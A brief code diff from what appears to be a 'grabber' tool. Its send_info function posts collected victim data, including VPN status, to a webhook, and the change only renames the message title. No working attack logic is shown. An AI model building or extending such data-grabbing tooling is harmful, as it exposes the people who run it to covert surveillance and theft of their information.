@@ -70,7 +70,7 @@ def send_info(webhook, data):
                     f"**VPN Status**🔒\nVPN: {data['vpn_status']}"
                 ),
                 "fields": [],
-                "title": "VPT GRABBER"
+                "title": "GRABBER"
             }
         ],
         "components": [],
